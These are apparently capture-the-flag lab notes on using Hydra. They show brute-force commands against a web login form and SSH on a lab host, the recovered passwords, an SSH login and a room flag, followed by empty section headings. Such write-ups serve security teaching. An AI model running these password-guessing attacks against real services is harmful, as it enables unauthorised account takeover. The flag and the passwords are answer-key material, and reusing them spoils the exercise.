## Hydra

Running Hydra against a website with a post-form 
```
hydra -l <username> -P <wordlist> 10.10.152.159 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Running Hydra against a service
In this case it's ssh
```
hydra -l <username> -P <full path to pass> 10.10.152.159 -t 4 ssh
```

#### Using Hydra

Target IP: 10.10.152.159

###### Questions
Use Hydra to bruteforce molly's web password. What is flag 1?

```
hydra -l molly -P rockyou.txt 10.10.152.129 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v

[80][http-post-form] host: 10.10.152.159   login: molly   password: sunshine
```


Use Hydra to bruteforce molly's SSH password. What is flag 2?
```
hydra -l molly -P rockyou.txt 10.10.152.159 ssh 

[22][ssh] host: 10.10.152.159   login: molly   password: butterfly
```

```
ssh molly@10.10.152.159 
password: butterfly
cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

## Brute Force Heroes

#### Introduction

#### Getting started - Burp Suite

#### Brute forcing - Burp Suite

#### Brute forcing - Patator

#### Brute forcing - ZAP
#### Brute forcing - SSH (Hydra + Patator)

#### Brute forcing - Hashes

#### Conclusion

